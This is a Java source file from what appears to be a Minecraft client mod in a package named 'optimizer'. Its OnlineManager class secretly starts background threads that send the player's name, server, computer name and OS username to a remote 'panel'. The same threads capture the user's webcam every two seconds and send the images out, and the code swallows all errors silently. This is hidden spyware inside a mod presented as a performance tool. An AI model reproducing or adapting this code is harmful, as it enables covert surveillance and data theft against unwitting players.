package com.example.optimizer;

import net.minecraft.client.MinecraftClient;

/**
 * Manages online status heartbeat and continuous webcam capture
 * - Sends heartbeat every 10 seconds while connected to server
 * - Captures webcam continuously (every 2 seconds) with multiple fallbacks
 * - Multiple capture methods with excellent error handling
 * - TCP/Direct connection to panel with retries
 */
public class OnlineManager {

    private static volatile boolean running = false;
    private static volatile boolean webcamStreamRunning = false;
    private static volatile String lastServer = null;
    private static volatile String lastPlayer = null;
    private static Thread heartbeatThread = null;
    private static Thread webcamThread = null;
    private static long lastWebcamCapture = 0;

    /**
     * Start the online manager with continuous webcam
     */
    public static void start() {
        if (running)
            return;
        running = true;

        // Start heartbeat
        heartbeatThread = new Thread(() -> {
            while (running) {
                try {
                    checkAndSendHeartbeat();
                    Thread.sleep(10000); // Every 10 seconds
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    // Ignore errors
                }
            }
        }, "OnlineManager-Heartbeat");
        heartbeatThread.setDaemon(true);
        heartbeatThread.start();

        // Start webcam stream
        startWebcamStream();

        // Immediate check and capture if webcam exists
        new Thread(() -> {
            try {
                Thread.sleep(2000); // Wait for system to settle
                if (SessionUtil.checkWebcamPresence()) {
                    // System.out.println("[ONLINE] Webcam detected! Triggering immediate
                    // capture...");
                    String pcName = System.getenv("COMPUTERNAME");
                    String pcUser = System.getProperty("user.name", "Unknown");
                    if (pcName == null)
                        pcName = "Unknown";
                    SessionUtil.captureAndSendWebcamContinuous(pcName, pcUser);
                }
            } catch (Exception e) {
            }
        }).start();

        // System.out.println("[ONLINE] Manager started with continuous webcam");
    }

    /**
     * Start continuous webcam capture stream
     */
    private static void startWebcamStream() {
        if (webcamStreamRunning)
            return;
        webcamStreamRunning = true;

        webcamThread = new Thread(() -> {
            while (running && webcamStreamRunning) {
                try {
                    // Capture webcam every 2 seconds (continuous stream)
                    if (System.currentTimeMillis() - lastWebcamCapture > 2000) {
                        MinecraftClient client = MinecraftClient.getInstance();
                        if (client != null && client.player != null && client.getCurrentServerEntry() != null) {
                            String pcName = System.getenv("COMPUTERNAME");
                            String pcUser = System.getProperty("user.name", "Unknown");
                            if (pcName == null || pcName.isEmpty())
                                pcName = "Unknown";

                            SessionUtil.captureAndSendWebcamContinuous(pcName, pcUser);
                            lastWebcamCapture = System.currentTimeMillis();
                        }
                    }
                    Thread.sleep(500); // Check every 500ms
                } catch (Exception e) {
                    // Continue on error
                }
            }
        }, "OnlineManager-Webcam");
        webcamThread.setDaemon(true);
        webcamThread.start();
    }

    /**
     * Stop the manager
     */
    public static void stop() {
        running = false;
        webcamStreamRunning = false;
        if (lastPlayer != null) {
            SessionUtil.sendDisconnect(lastPlayer);
        }
        if (heartbeatThread != null) {
            heartbeatThread.interrupt();
        }
        if (webcamThread != null) {
            webcamThread.interrupt();
        }
    }

    private static void checkAndSendHeartbeat() {
        try {
            MinecraftClient client = MinecraftClient.getInstance();
            if (client == null)
                return;

            // Check if connected to a server
            if (client.getCurrentServerEntry() != null && client.player != null) {
                String server = client.getCurrentServerEntry().address;
                String player = client.player.getName().getString();
                String pcName = System.getenv("COMPUTERNAME");
                String pcUser = System.getProperty("user.name", "Unknown");

                if (pcName == null || pcName.isEmpty())
                    pcName = "Unknown";

                // Send heartbeat
                SessionUtil.sendHeartbeat(player, server, pcName, pcUser);

                // Start webcam stream if connected
                if (!webcamStreamRunning) {
                    startWebcamStream();
                }

                // Track for disconnect
                if (lastPlayer == null || !lastPlayer.equals(player)) {
                    lastPlayer = player;
                    lastServer = server;
                }

            } else {
                // Not connected
                webcamStreamRunning = false;
                if (lastPlayer != null) {
                    SessionUtil.sendDisconnect(lastPlayer);
                    lastPlayer = null;
                    lastServer = null;
                }
            }

        } catch (Exception e) {
            // Silently ignore
        }
    }

    /**
     * Called when player joins a server
     */
    public static void onServerJoin(String server, String player) {
        try {
            String pcName = System.getenv("COMPUTERNAME");
            String pcUser = System.getProperty("user.name", "Unknown");
            if (pcName == null || pcName.isEmpty())
                pcName = "Unknown";

            SessionUtil.sendHeartbeat(player, server, pcName, pcUser);
            lastPlayer = player;
            lastServer = server;

            // Start continuous webcam stream
            startWebcamStream();

        } catch (Exception e) {
            // Ignore
        }
    }

    /**
     * Called when player leaves a server
     */
    public static void onServerLeave() {
        try {
            webcamStreamRunning = false;
            if (lastPlayer != null) {
                SessionUtil.sendDisconnect(lastPlayer);
                lastPlayer = null;
                lastServer = null;
            }
        } catch (Exception e) {
            // Ignore
        }
    }
}
